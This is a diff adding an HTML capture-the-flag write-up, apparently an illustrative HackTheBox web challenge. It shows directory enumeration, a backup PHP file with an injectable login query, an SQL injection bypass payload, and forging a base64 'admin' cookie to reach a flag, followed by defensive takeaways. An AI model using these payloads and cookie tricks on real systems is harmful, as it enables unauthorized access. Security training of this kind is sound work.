@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Challenge Example - HackTheBox - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="writeup">
+                <div class="section-header">
+                    <h1>/// WEB CHALLENGE EXAMPLE</h1>
+                </div>
+
+                <div class="writeup-meta">
+                    <p><strong>Platform:</strong> HackTheBox | <strong>Type:</strong> Challenge | <strong>Category:</strong> Web</p>
+                    <p><strong>Difficulty:</strong> <span class="difficulty easy">Easy</span> | <strong>Date:</strong> 2026-01-25</p>
+                </div>
+
+                <p><a href="../hackthebox.html">&lt;&lt; Back to HackTheBox</a></p>
+
+                <div class="content">
+                    <h2>## Challenge Description</h2>
+                    
+                    <p>A simple web application with a login page. Can you bypass the authentication and retrieve the flag?</p>
+
+                    <h2>## Initial Analysis</h2>
+                    
+                    <p>When we first access the challenge, we're presented with a basic login form:</p>
+
+                    <pre><code>http://challenge.htb:1337/login</code></pre>
+
+                    <p>Looking at the page source, we notice the application is built with PHP and uses cookies for session management.</p>
+
+                    <h2>## Reconnaissance</h2>
+
+                    <p>Let's start by exploring the application structure:</p>
+
+                    <pre><code>$ gobuster dir -u http://challenge.htb:1337/ -w /usr/share/wordlists/dirb/common.txt
+
+/admin                (Status: 302) [Size: 0] [--> /login]
+/index.php            (Status: 200) [Size: 1234]
+/login                (Status: 200) [Size: 2345]
+/logout               (Status: 302) [Size: 0] [--> /login]
+/robots.txt           (Status: 200) [Size: 42]</code></pre>
+
+                    <p>Checking <code>robots.txt</code>:</p>
+
+                    <pre><code>User-agent: *
+Disallow: /backup/</code></pre>
+
+                    <h2>## Vulnerability Discovery</h2>
+
+                    <p>Accessing <code>/backup/</code> reveals a directory listing with an interesting file:</p>
+
+                    <pre><code>Index of /backup/
+- auth.php.bak</code></pre>
+
+                    <p>Downloading and analyzing the backup file:</p>
+
+                    <pre><code>&lt;?php
+// auth.php.bak
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+// TODO: Fix SQL injection vulnerability
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+$result = mysqli_query($conn, $query);
+
+if(mysqli_num_rows($result) > 0) {
+    $_SESSION['logged_in'] = true;
+    setcookie('admin', base64_encode('false'), time()+3600);
+    header('Location: /admin');
+}
+?&gt;</code></pre>
+
+                    <h2>## Exploitation</h2>
+
+                    <h3>SQL Injection</h3>
+
+                    <p>The login form is vulnerable to SQL injection. We can bypass authentication:</p>
+
+                    <pre><code>Username: admin' OR '1'='1' --
+Password: anything</code></pre>
+
+                    <h3>Cookie Manipulation</h3>
+
+                    <p>After logging in, we're redirected but still can't access the admin panel. Checking our cookies:</p>
+
+                    <pre><code>admin=ZmFsc2U=</code></pre>
+
+                    <p>Decoding the base64:</p>
+
+                    <pre><code>$ echo "ZmFsc2U=" | base64 -d
+false</code></pre>
+
+                    <p>Let's change it to "true":</p>
+
+                    <pre><code>$ echo -n "true" | base64
+dHJ1ZQ==</code></pre>
+
+                    <p>Setting the cookie <code>admin=dHJ1ZQ==</code> and refreshing the page...</p>
+
+                    <h2>## Flag</h2>
+
+                    <p>After manipulating the cookie, we get access to the admin panel which reveals the flag:</p>
+
+                    <pre><code>HTB{c00k13_m4n1pul4t10n_4nd_sql1_ftw}</code></pre>
+
+                    <h2>## Key Takeaways</h2>
+
+                    <ul>
+                        <li>Always check for backup files and common paths like robots.txt</li>
+                        <li>SQL injection remains a critical vulnerability in web applications</li>
+                        <li>Client-side security controls (like base64 encoded cookies) provide no real security</li>
+                        <li>Never trust user input - always use prepared statements for database queries</li>
+                    </ul>
+
+                    <h2>## Tools Used</h2>
+
+                    <ul>
+                        <li>Gobuster - Directory enumeration</li>
+                        <li>Burp Suite - Request interception and cookie manipulation</li>
+                        <li>Browser Developer Tools - Cookie inspection</li>
+                    </ul>
+                </div>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Web Challenge Example</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
+                <a href="../hackthebox.html">&lt;&lt; Back to HackTheBox</a>
+            </div>
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
+</code></pre>
